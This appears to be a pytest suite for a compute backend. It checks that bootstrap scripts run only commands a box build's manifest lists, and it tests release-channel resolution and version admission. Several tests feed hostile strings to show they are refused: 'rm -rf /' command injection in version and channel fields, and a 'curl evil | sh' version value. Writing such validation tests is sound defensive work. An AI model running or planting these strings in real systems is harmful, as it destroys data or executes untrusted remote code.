"""The box contract: a machine is told to run only what its build has.

The backend and the box ship separately, so the bootstrap the backend renders
must start a command the installed build knows. These tests pin that every
bootstrap variant rendered for the oldest build the backend serves
(``MIN_SUPPORTED_BOX``, whose manifest is committed) invokes only commands that
build has, and that the release a machine installs is resolved, and its
command chosen, from the build's own manifest.
"""

from __future__ import annotations

import json
import re
from typing import Any

import httpx
import pytest
import respx
from alkera_core.compute.bootstrap import (
    BOOTSTRAP_PROVIDERS,
    LOCALDEV_DAEMON,
    BootstrapSpec,
    boot_profile,
    render_bootstrap,
)
from alkera_core.compute.box_builds import USER_AGENT, http_release_host, plan_for
from alkera_core.compute.box_contract import (
    BASELINE_MANIFESTS,
    BOX_COMMANDS,
    BOX_MANIFEST_PATH,
    ENV_CONTRACT,
    MIN_SUPPORTED_BOX,
    RUN_COMMAND,
    SOURCE_VERSION,
    START_COMMAND,
    START_MODE_ENV,
    SUPERVISE_COMMAND,
    Admission,
    BootstrapPlan,
    BoxBuild,
    BoxCapability,
    BoxContractError,
    BoxManifestError,
    ReleaseHostError,
    StartMode,
    admit_claim,
    bootstrap_plan,
    resolve_release,
    resolve_version,
    source_build,
)
from alkera_core.compute.daemon_source import RELEASE_DOWNLOAD, SERVED_BUNDLE
from alkera_core.compute.provider import TRANSIENT_FAILURE, ComputeProviderError
from alkera_core.config import Settings
from alkera_test_support.compute.fake_release_host import FakeReleaseHost

BASE = "https://releases.example.test"


def _committed(version: str) -> BoxBuild:
    path = BASELINE_MANIFESTS / f"{version}.json"
    return BoxBuild.from_manifest(json.loads(path.read_text(encoding="utf-8")))


def _spec(provider: str) -> BootstrapSpec:
    return BootstrapSpec(
        provider=provider,
        allocation_id="12345678-1234-5678-1234-567812345678",
        machine_name="node-1",
        type_code="t",
        tenancy="pool",
        api_url="https://api.example.test",
        release_base_url=BASE,
        credential_secret="alkera/node/1" if boot_profile(provider).needs_region else "",
        region="us-east-1",
        sandbox_mode=boot_profile(provider).sandbox_mode("gvisor"),
    )


#: An invocation of the box binary in a rendered script: the release's
#: ``alkera.dist/alkera`` (quoted or not) or the source venv's daemon.
_INVOCATION = re.compile(
    r'(?:alkera\.dist/alkera"?|' + re.escape(LOCALDEV_DAEMON) + r")\s+(?P<rest>[^\n]*)"
)
_WORD = re.compile(r"[a-z][a-z0-9-]*")


def invocations(script: str) -> list[str]:
    """The command path of every box-binary invocation in ``script``. A path
    used as a file test (``[ -x ... ]``) or a link's source is not an invocation; one followed by
    anything but a literal command (a shell variable) reads as ``""``, which no
    build has."""
    paths = []
    for match in _INVOCATION.finditer(script):
        if match.group("rest").startswith("]"):
            continue
        line_start = script.rfind("\n", 0, match.start()) + 1
        if "ln -s" in script[line_start : match.start()]:
            # The build linked onto PATH: a link's source, not a run of it.
            continue
        words = []
        for token in match.group("rest").split():
            if _WORD.fullmatch(token):
                words.append(token)
                continue
            if token.lstrip('"').startswith("$"):
                # The command is chosen at boot, not by the build's manifest.
                words = []
            break
        paths.append(" ".join(words))
    return paths


def unknown_invocations(script: str, build: BoxBuild) -> list[str]:
    return [path for path in invocations(script) if path not in build.commands]


# -- the gate -------------------------------------------------------------------


@pytest.mark.parametrize("provider", BOOTSTRAP_PROVIDERS)
def test_every_bootstrap_for_the_oldest_served_build_runs_only_its_commands(
    provider: str,
) -> None:
    oldest = _committed(MIN_SUPPORTED_BOX)
    script = render_bootstrap(
        _spec(provider), bootstrap_plan(MIN_SUPPORTED_BOX, oldest, wanted=StartMode.SUPERVISE)
    )
    assert invocations(script), "the scan found no box invocation; it has gone blind"
    assert unknown_invocations(script, oldest) == []


def test_the_scan_catches_a_command_the_build_lacks() -> None:
    oldest = _committed(MIN_SUPPORTED_BOX)
    planted = (
        "ExecStart=$BOX_ROOT/alkera.dist/alkera cloud-mirror supervise\n"
        '  while true; do "$BOX_ROOT/alkera.dist/alkera" cloud-mirror run || true; done\n'
        f"  {LOCALDEV_DAEMON} cloud-mirror supervise &\n"
        "ExecStart=$BOX_ROOT/alkera.dist/alkera cloud-mirror $MIRROR_COMMAND\n"
        '"$BOX_ROOT/alkera.dist/alkera" "$COMMAND"\n'
    )
    assert unknown_invocations(planted, oldest) == [
        "cloud-mirror supervise",
        "cloud-mirror supervise",
        "",
        "",
    ]


# -- choosing the command -------------------------------------------------------


def _build(*commands: str, env_contract: int = ENV_CONTRACT) -> BoxBuild:
    return BoxBuild(
        version="9.9.9",
        commands=frozenset(commands),
        capabilities=frozenset(),
        env_contract=env_contract,
    )


@pytest.mark.parametrize(
    ("build", "wanted", "mode"),
    [
        pytest.param(
            _committed("0.5.0"), StartMode.SUPERVISE, StartMode.SINGLE, id="published-0.5.0"
        ),
        pytest.param(
            _build("cloud-mirror", RUN_COMMAND, SUPERVISE_COMMAND),
            StartMode.SUPERVISE,
            StartMode.SUPERVISE,
            id="has-the-supervisor",
        ),
        pytest.param(
            _build("cloud-mirror", RUN_COMMAND, SUPERVISE_COMMAND),
            StartMode.SINGLE,
            StartMode.SINGLE,
            id="a-profile-that-runs-single",
        ),
    ],
)
def test_bootstrap_uses_only_commands_the_build_has(
    build: BoxBuild, wanted: StartMode, mode: StartMode
) -> None:
    """Every box starts with the one command every build has; the mode is the
    profile's, and the single daemon on a build with no supervisor."""
    plan = bootstrap_plan("0.5.0-g951dac943d65", build, wanted=wanted)
    assert plan == BootstrapPlan(version="0.5.0-g951dac943d65", start_mode=mode)
    for provider in ("ec2", "runpod"):
        script = render_bootstrap(_spec(provider), plan)
        assert set(invocations(script)) == {START_COMMAND}
        assert f"{START_MODE_ENV}={mode.value}" in script.splitlines()


@pytest.mark.parametrize(
    "build",
    [
        pytest.param(_build("serve", "cloud-mirror"), id="no-box-command"),
        pytest.param(_build(SUPERVISE_COMMAND), id="no-start-command"),
        pytest.param(_build(RUN_COMMAND, env_contract=ENV_CONTRACT + 1), id="newer-env-contract"),
        pytest.param(_build(RUN_COMMAND, env_contract=0), id="older-env-contract"),
    ],
)
def test_a_build_the_backend_cannot_start_is_refused(build: BoxBuild) -> None:
    with pytest.raises(BoxContractError):
        bootstrap_plan("9.9.9", build, wanted=StartMode.SUPERVISE)


@pytest.mark.parametrize("version", ["", "1.0; rm -rf /", "1.0 2"])
def test_a_version_that_is_not_a_release_label_is_refused(version: str) -> None:
    with pytest.raises(BoxContractError):
        bootstrap_plan(version, _build(RUN_COMMAND), wanted=StartMode.SINGLE)


def test_a_source_box_starts_the_supervisor() -> None:
    plan = bootstrap_plan(SOURCE_VERSION, source_build(), wanted=StartMode.SUPERVISE)
    assert plan == BootstrapPlan(version="source", start_mode=StartMode.SUPERVISE)
    assert set(BOX_COMMANDS) <= source_build().commands


# -- the manifest document ------------------------------------------------------


def test_a_manifest_reads_back_what_it_wrote_and_skips_capabilities_it_does_not_know() -> None:
    build = BoxBuild(
        version="0.6.0",
        commands=frozenset({RUN_COMMAND}),
        capabilities=frozenset({BoxCapability.ORG_WORKERS}),
        env_contract=1,
    )
    doc = build.to_manifest() | {"capabilities": ["org_workers", "teleport_v9"]}
    assert BoxBuild.from_manifest(doc) == build


@pytest.mark.parametrize(
    "doc",
    [
        pytest.param({"commands": [], "capabilities": [], "env_contract": 1}, id="no-version"),
        pytest.param(
            {"version": "1", "commands": "run", "capabilities": [], "env_contract": 1},
            id="commands-not-a-list",
        ),
        pytest.param(
            {"version": "1", "commands": [""], "capabilities": [], "env_contract": 1},
            id="an-empty-command",
        ),
        pytest.param(
            {"version": "1", "commands": [], "capabilities": [], "env_contract": True},
            id="env-contract-not-a-number",
        ),
        pytest.param({"version": "1", "commands": [], "capabilities": []}, id="no-env-contract"),
    ],
)
def test_a_manifest_that_does_not_describe_a_build_is_refused(doc: dict[str, Any]) -> None:
    with pytest.raises(BoxManifestError):
        BoxBuild.from_manifest(doc)


# -- resolving the release ------------------------------------------------------

_STABLE = {"channel": "stable", "version": "0.5.0"}
_STAGING = {"channel": "nodes-staging", "version": "0.5.0-g951dac943d65"}


@pytest.mark.parametrize(
    ("pinned", "channel", "documents", "expected", "asked"),
    [
        pytest.param(
            "",
            "staging",
            {"cli/nodes/staging.json": _STAGING, "cli/stable.json": _STABLE},
            "0.5.0-g951dac943d65",
            ["cli/nodes/staging.json"],
            id="a-node-installs-the-build-its-environments-channel-names",
        ),
        pytest.param(
            "",
            "prod",
            {"cli/stable.json": _STABLE},
            "0.5.0",
            ["cli/nodes/prod.json", "cli/stable.json"],
            id="a-channel-no-deploy-has-written-falls-back-to-the-stable-release",
        ),
        pytest.param(
            "",
            "staging",
            {"cli/nodes/staging.json": {}, "cli/stable.json": _STABLE},
            "0.5.0",
            ["cli/nodes/staging.json", "cli/stable.json"],
            id="a-channel-that-names-nothing-falls-back-to-the-stable-release",
        ),
        pytest.param(
            "",
            "",
            {"cli/nodes/staging.json": _STAGING, "cli/stable.json": _STABLE},
            "0.5.0",
            ["cli/stable.json"],
            id="no-channel-is-the-stable-release",
        ),
        pytest.param(
            "0.4.9",
            "staging",
            {"cli/nodes/staging.json": _STAGING, "cli/stable.json": _STABLE},
            "0.4.9",
            [],
            id="a-pinned-version-is-installed-and-no-pointer-is-read",
        ),
    ],
)
async def test_the_node_installs_what_its_channel_names(
    pinned: str, channel: str, documents: dict[str, Any], expected: str, asked: list[str]
) -> None:
    host = FakeReleaseHost(documents=dict(documents))
    assert await resolve_version(host.fetcher(BASE), pinned=pinned, channel=channel) == expected
    assert host.asked == asked


async def test_a_channel_the_host_cannot_serve_is_an_error_not_the_stable_release() -> None:
    host = FakeReleaseHost(
        documents={
            "cli/nodes/staging.json": ReleaseHostError("timed out"),
            "cli/stable.json": _STABLE,
        }
    )
    with pytest.raises(ReleaseHostError):
        await resolve_version(host.fetcher(BASE), pinned="", channel="staging")


@pytest.mark.parametrize(
    ("pinned", "channel"),
    [
        pytest.param("", "staging; rm -rf /", id="channel-injection"),
        pytest.param("", "Staging", id="channel-not-a-channel-name"),
        pytest.param("1.0; rm -rf /", "", id="version-injection"),
    ],
)
async def test_a_pointer_or_pin_that_is_not_a_name_is_refused(pinned: str, channel: str) -> None:
    host = FakeReleaseHost.serving()
    with pytest.raises(BoxContractError):
        await resolve_version(host.fetcher(BASE), pinned=pinned, channel=channel)


async def test_a_channel_naming_a_hostile_version_is_refused() -> None:
    host = FakeReleaseHost(documents={"cli/nodes/prod.json": {"version": "1; curl evil | sh"}})
    with pytest.raises(BoxContractError):
        await resolve_version(host.fetcher(BASE), pinned="", channel="prod")


async def test_a_release_with_a_manifest_runs_what_its_manifest_lists() -> None:
    label = "0.6.0-gabcdefabcdef"
    host = FakeReleaseHost(
        documents={
            "cli/stable.json": {"version": label},
            BOX_MANIFEST_PATH.format(version=label): _build(
                RUN_COMMAND, SUPERVISE_COMMAND
            ).to_manifest(),
        }
    )
    plan = await resolve_release(
        host.fetcher(BASE), pinned="", channel="", wanted=StartMode.SUPERVISE
    )
    assert plan == BootstrapPlan(version=label, start_mode=StartMode.SUPERVISE)


async def test_a_release_published_before_manifests_is_read_as_the_oldest_served_build() -> None:
    """A box build a deploy published before builds printed a manifest runs
    the command every served build has, never one it may lack."""
    host = FakeReleaseHost(documents={"cli/nodes/staging.json": _STAGING})
    plan = await resolve_release(
        host.fetcher(BASE), pinned="", channel="staging", wanted=StartMode.SUPERVISE
    )
    assert plan == BootstrapPlan(version="0.5.0-g951dac943d65", start_mode=StartMode.SINGLE)
    assert host.asked[-1] == "cli/v0.5.0-g951dac943d65/linux-x64/box-manifest.json"


# -- the release host over HTTP -------------------------------------------------

_S3_MISSING = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    "<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>"
)


@pytest.mark.parametrize(
    ("response", "expected"),
    [
        pytest.param(httpx.Response(200, json={"version": "0.5.0"}), {"version": "0.5.0"}),
        pytest.param(httpx.Response(404), None, id="not-found"),
        pytest.param(httpx.Response(403, text=_S3_MISSING), None, id="bucket-key-missing"),
    ],
)
@respx.mock
async def test_the_release_host_reads_a_document_or_its_absence(
    response: httpx.Response, expected: dict[str, Any] | None
) -> None:
    route = respx.get(f"{BASE}/cli/stable.json").mock(return_value=response)
    assert await http_release_host(BASE + "/")("cli/stable.json") == expected
    assert route.calls.last.request.headers["User-Agent"] == USER_AGENT


@pytest.mark.parametrize(
    "response",
    [
        pytest.param(httpx.Response(403, text="<html>blocked</html>"), id="firewall-refusal"),
        pytest.param(httpx.Response(503), id="server-error"),
        pytest.param(httpx.Response(200, text="not json"), id="not-json"),
        pytest.param(httpx.Response(200, json=["a"]), id="not-an-object"),
        pytest.param(httpx.ConnectError("refused"), id="unreachable"),
    ],
)
@respx.mock
async def test_a_release_host_that_cannot_answer_is_an_error(
    response: httpx.Response | Exception,
) -> None:
    route = respx.get(f"{BASE}/cli/stable.json")
    if isinstance(response, Exception):
        route.mock(side_effect=response)
    else:
        route.mock(return_value=response)
    with pytest.raises(ReleaseHostError):
        await http_release_host(BASE)("cli/stable.json")


# -- the plan a launch renders ----------------------------------------------------


async def test_a_source_box_is_planned_without_reading_the_release_host(
    release_host: FakeReleaseHost,
) -> None:
    plan = await plan_for(boot_profile("localdev"), Settings())
    assert plan == BootstrapPlan(version=SOURCE_VERSION, start_mode=StartMode.SUPERVISE)
    assert release_host.asked == []


async def test_a_served_bundle_box_is_planned_from_this_checkout_without_the_release_host(
    release_host: FakeReleaseHost,
) -> None:
    """The bundle a deployment serves is built from its own checkout, so the
    plan is the source build's even for a provider that would install a release."""
    config = Settings(alkera_node_daemon_version="9.9.9", alkera_node_release_channel="prod")
    plan = await plan_for(boot_profile("ec2"), config, source=SERVED_BUNDLE)
    assert plan == BootstrapPlan(version=SOURCE_VERSION, start_mode=StartMode.SUPERVISE)
    assert release_host.asked == []


async def test_a_release_box_is_planned_from_the_configured_host(
    release_host: FakeReleaseHost,
) -> None:
    config = Settings(alkera_node_daemon_version="", alkera_node_release_channel="")
    plan = await plan_for(boot_profile("ec2"), config, source=RELEASE_DOWNLOAD)
    assert plan == BootstrapPlan(version="1.4.2", start_mode=StartMode.SUPERVISE)


async def test_a_runpod_box_runs_the_single_daemon_whatever_its_build_has(
    release_host: FakeReleaseHost,
) -> None:
    """An unprivileged pod with no init cannot give an org worker its own
    cgroup and namespaces, so it is never told to supervise."""
    config = Settings(alkera_node_daemon_version="", alkera_node_release_channel="")
    plan = await plan_for(boot_profile("runpod"), config, source=RELEASE_DOWNLOAD)
    assert plan == BootstrapPlan(version="1.4.2", start_mode=StartMode.SINGLE)


async def test_an_unreachable_release_host_is_a_transient_provider_failure(
    release_host: FakeReleaseHost,
) -> None:
    release_host.documents["cli/stable.json"] = ReleaseHostError("timed out")
    config = Settings(alkera_node_daemon_version="", alkera_node_release_channel="")
    with pytest.raises(ComputeProviderError) as refused:
        await plan_for(boot_profile("ec2"), config, source=RELEASE_DOWNLOAD)
    assert refused.value.kind == TRANSIENT_FAILURE


# -- admitting a box --------------------------------------------------------------


@pytest.mark.parametrize(
    ("reported", "admitted"),
    [
        pytest.param("0.5.0", True, id="the-minimum"),
        pytest.param("0.5.0 (build 951dac943d65)", True, id="the-minimum-with-a-build"),
        pytest.param("0.5.1", True, id="a-patch-above"),
        pytest.param("1", True, id="a-major-above"),
        pytest.param("0.4.9", False, id="a-patch-below"),
        pytest.param("0.4.99 (build abc)", False, id="below-with-a-build"),
        pytest.param("0.0.0", False, id="zero"),
        pytest.param("0", False, id="a-bare-zero"),
        pytest.param("", True, id="nothing-reported"),
        pytest.param(None, True, id="a-beat-that-leaves-it-out"),
        pytest.param("source", True, id="no-leading-number"),
    ],
)
def test_a_box_below_the_minimum_is_refused(reported: str | None, admitted: bool) -> None:
    admission = admit_claim(reported)
    assert admission.admitted is admitted
    if admitted:
        assert admission == Admission(admitted=True)
    else:
        assert admission.code == "box_too_old"
        assert admission.message == "This machine's software is too old. Replace it to update."


def test_the_minimum_is_the_published_stable_so_no_box_is_refused_on_day_one() -> None:
    assert MIN_SUPPORTED_BOX == "0.5.0"
    assert admit_claim(_committed(MIN_SUPPORTED_BOX).version).admitted
